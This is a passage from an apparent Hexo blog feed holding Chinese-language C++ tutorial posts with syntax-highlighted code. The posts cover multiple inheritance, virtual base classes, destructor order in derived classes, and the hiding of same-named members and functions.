class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">pople</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">pople</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;pople created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;                                     <span class="comment">//eat</span></span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;pople eat!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">wolf</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">wolf</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;wolf created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;                                     <span class="comment">//eat</span></span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;wolf eat!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/07/01/understandinheritance/001.png" class=""><p>用父类作用域的函数是最直接的行为。</p><p>另一种就是uisng去强制解锁。但是面对重名的情况感觉还是靠作用域比较好。</p><p>不过归根到底，展现给用户的肯定是越简单越好。</p><p>那么究竟是处于哪个父类的状态时就调用哪个父类的功能，比如加个if，条件可以自己想，狼人，要么怒气拉满，要么月圆之夜什么的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">werewolf</span>:<span class="keyword">public</span> pople,<span class="keyword">public</span> wolf&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">werewolf</span>()&#123;</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; &quot;werewolf created\n&quot;;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (anger == <span class="number">100</span>) wolf::<span class="built_in">eat</span>();</span><br><span class="line"><span class="keyword">else</span> pople::<span class="built_in">eat</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> anger = <span class="number">0</span>;<span class="comment">//怒气</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当怒气为0的时候，还处于人类状态，行为自然就是人类的行为这很好理解。</p><img src="/2022/07/01/understandinheritance/002.png" class=""><p>修改怒气为100的时候，达到了变身条件，处于狼的状态，行为转化为狼的行为</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">short</span> anger = <span class="number">100</span>;<span class="comment">//怒气</span></span><br></pre></td></tr></table></figure><img src="/2022/07/01/understandinheritance/003.png" class=""><p>至于怒气怎么增加，就看想要什么样的感觉设定了，这就不讨论了。</p><hr><h2 id="多重继承重复"><a href="#多重继承重复" class="headerlink" title="多重继承重复"></a>多重继承重复</h2><p>werewolf是继承自wolf和pople。倘若wolf和pople也有父类。<br>那么werewolf就会出现重复的问题。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">animal</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="type">int</span> y;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">pople</span>:<span class="keyword">public</span> animal&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">pople</span>()&#123;</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; &quot;pople created\n&quot;;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;pople eat!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">wolf</span>:<span class="keyword">public</span> animal&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">wolf</span>()&#123;</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; &quot;wolf created\n&quot;;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;wolf eat!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">werewolf</span>:<span class="keyword">public</span> pople,<span class="keyword">public</span> wolf&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">werewolf</span>()&#123;</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; &quot;werewolf created\n&quot;;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (anger == <span class="number">100</span>) wolf::<span class="built_in">eat</span>();</span><br><span class="line"><span class="keyword">else</span> pople::<span class="built_in">eat</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> anger = <span class="number">100</span>;<span class="comment">//怒气</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们创建新的类animal，让wolf和pople去继承。<br>并且animal类中有两个成员变量x,y。</p><p>当我们给werewolf实例化对象的x和y赋值的时候就能看到问题了：</p><img src="/2022/07/01/understandinheritance/004.png" class=""><p>编译器提示到x不明确，为什么会不明确</p><img src="/2022/07/01/understandinheritance/005.png" class=""><p>随便画个草图示意。就是因为多重继承的时候，父类的父类，套娃了。重复继承了xy属性。</p><p>解决这种情况，肯定是作用域最直接，直接告诉他指向哪个区域就行了。</p><img src="/2022/07/01/understandinheritance/006.png" class=""><img src="/2022/07/01/understandinheritance/007.png" class=""><p>而且多重继承带来的问题就是内存，animal的属性被wolf和pople分别继承之后，又共同被werewolf继承，这样一来，werewolf就会有多组的x和y占用内存。</p><p>还有一种方法就是虚基类，也是跟后面虚函数有点关系。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">animal</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="type">int</span> y;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">pople</span>:<span class="keyword">public</span> <span class="keyword">virtual</span> animal&#123;                          <span class="comment">//虚基类</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">pople</span>()&#123;</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; &quot;pople created\n&quot;;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;pople eat!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">wolf</span>:<span class="keyword">public</span> <span class="keyword">virtual</span> animal&#123;                           <span class="comment">//虚基类</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">wolf</span>()&#123;</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; &quot;wolf created\n&quot;;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;wolf eat!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">werewolf</span>:<span class="keyword">public</span> pople,<span class="keyword">public</span> wolf&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">werewolf</span>()&#123;</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; &quot;werewolf created\n&quot;;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (anger == <span class="number">100</span>) wolf::<span class="built_in">eat</span>();</span><br><span class="line"><span class="keyword">else</span> pople::<span class="built_in">eat</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> anger = <span class="number">100</span>;<span class="comment">//怒气</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>通过两组虚继承之后，测试之前的样例：</p><img src="/2022/07/01/understandinheritance/008.png" class=""><p>看到wolf的xy居然都变成了pople的xy设置的值，这也是<code>virtual</code>的好处，他会判断是否重复引用了，当子类重复继承到父类的属性的时候，就会主动忽略掉。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>只不过多重继承带来的组合问题，有些时候不利于解读，毕竟从小零件构造大物件，还是把大物件拆成小零件。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>派生类的析构函数和重名问题</title>
      <link href="/2022/06/30/DerivedclassFun1/"/>
      <url>/2022/06/30/DerivedclassFun1/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>析构函数其实挺好猜，毕竟就一个，也没有重载。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="析构函数"><a href="#析构函数" class="headerlink" title="析构函数"></a>析构函数</h2><p><code>函数A-&gt;B-&gt;C</code>它的析构函数其实可以猜一猜顺序。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="type">int</span> y;</span><br><span class="line"><span class="built_in">father</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;father created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">father</span>(<span class="type">const</span> father &amp;f)&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;father copy created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">father</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;father delete\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> :<span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line"><span class="built_in">son</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;son created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">son</span>(<span class="type">const</span> son &amp;s) :father&#123;s&#125;&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;son copy created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">son</span>(<span class="type">int</span> _age) :age&#123; _age &#125;&#123;</span><br><span class="line">std::cout &lt;&lt; _age &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">son</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;son delete\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">grandson</span> :<span class="keyword">public</span> son&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">using</span> son::son;</span><br><span class="line"><span class="built_in">grandson</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;grandson created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">grandson</span>(<span class="type">const</span> grandson &amp;g) :son&#123;g&#125;&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;grandson copy created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">grandson</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;grandson delete\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>以上一个例子，挨个写个析构函数。</p><img src="/2022/06/30/DerivedclassFun1/000.png" class=""><p>结果其实显而易见，实例化的时候会先调用基类的构造，那么结束的时候肯定先从自身析构释放掉。</p><img src="/2022/06/30/DerivedclassFun1/001.png" class=""><p>相同的从son开始实例化，调用规则也是先执行基类的构造，析构从自己开始。</p><img src="/2022/06/30/DerivedclassFun1/002.png" class=""><p>其实就是跟内存分配有关，派生类要构造，肯定要在基类构造完的前提下，释放的是时候因为派生类实例化，所以从他自己开始释放这也没问题。</p><hr><h2 id="重名问题"><a href="#重名问题" class="headerlink" title="重名问题"></a>重名问题</h2><p>当基类和派生类的成员函数同名时，要分为两种情况</p><ol><li>函数名相同，参数不同<ol><li>using 基类::函数名</li></ol></li><li>函数名相同，参数相同<ol><li>基类::函数名</li></ol></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> x;                                                  <span class="comment">//成员变量x</span></span><br><span class="line"><span class="type">int</span> y;</span><br><span class="line"><span class="built_in">father</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;father created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">father</span>(<span class="type">const</span> father &amp;f)&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;father copy created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">father</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;father delete\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> :<span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> x;                                                  <span class="comment">//成员变量x</span></span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line"><span class="built_in">son</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;son created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">son</span>(<span class="type">const</span> son &amp;s) :father&#123;s&#125;&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;son copy created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">son</span>(<span class="type">int</span> _age) :age&#123; _age &#125;&#123;</span><br><span class="line">std::cout &lt;&lt; _age &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">son</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;son delete\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当两个类中都出现相同变量名时，编译的时候肯定不会出错，这是因为作用域的问题。<br>当son类要调用father的x时:</p><img src="/2022/06/30/DerivedclassFun1/003.png" class=""><p>直接调用毫无疑问就是自己作用域中的成员x。</p><img src="/2022/06/30/DerivedclassFun1/004.png" class=""><p>而我们说原因出在作用域上，解决办法也就是加上作用域区分。</p><p>在类中定义是如此，在实例化后调用</p><img src="/2022/06/30/DerivedclassFun1/005.png" class=""><p>看上去调用方式就像调用了成员然后作用域的变量一样。</p><p>当然可以选择验证一下，添加个getter函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="type">int</span> y;</span><br><span class="line"><span class="built_in">father</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;father created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">father</span>(<span class="type">const</span> father &amp;f)&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;father copy created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">father</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;father delete\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getX1</span><span class="params">()</span></span>&#123;                                <span class="comment">//get</span></span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> :<span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line"><span class="built_in">son</span>()&#123;</span><br><span class="line">x = <span class="number">100</span>;</span><br><span class="line">father::x = <span class="number">200</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;son created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">son</span>(<span class="type">const</span> son &amp;s) :father&#123;s&#125;&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;son copy created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">son</span>(<span class="type">int</span> _age) :age&#123; _age &#125;&#123;</span><br><span class="line">std::cout &lt;&lt; _age &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">son</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;son delete\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getX2</span><span class="params">()</span></span>&#123;                                <span class="comment">//get</span></span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里先搞变量重名的问题，函数先主动区分开。</p><img src="/2022/06/30/DerivedclassFun1/006.png" class=""><p>此处调用的时候显示的跟我们初始化是一样的，说明代码没问题。</p><blockquote><p>以后开发的时候，别人的类就很有可能是编译好之后发给你，那你就无法修改了，所以要注意自己做的时候。</p></blockquote><p>那么回到函数重命名的时候。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="type">int</span> y;</span><br><span class="line"><span class="built_in">father</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;father created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">father</span>(<span class="type">const</span> father &amp;f)&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;father copy created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">father</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;father delete\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getX</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son</span> :<span class="keyword">public</span> father&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="type">int</span> age;</span><br><span class="line"><span class="built_in">son</span>()&#123;</span><br><span class="line">x = <span class="number">100</span>;</span><br><span class="line">father::x = <span class="number">200</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;son created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">son</span>(<span class="type">const</span> son &amp;s) :father&#123;s&#125;&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;son copy created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">son</span>(<span class="type">int</span> _age) :age&#123; _age &#125;&#123;</span><br><span class="line">std::cout &lt;&lt; _age &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">son</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;son delete\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getX</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2022/06/30/DerivedclassFun1/008.png" class=""><p>当函数名相同，参数不同，他能看到的就只有自己作用域的。<br>想要访问到father的getx，就需要使用using解锁。</p><img src="/2022/06/30/DerivedclassFun1/009.png" class=""><p>解锁完之后，就会形成一种重载的风格。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="type">int</span> y;</span><br><span class="line"><span class="built_in">father</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;father created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">father</span>(<span class="type">const</span> father &amp;f)&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;father copy created\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">father</span>()&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;father delete\n&quot;</span>;</span><br><span 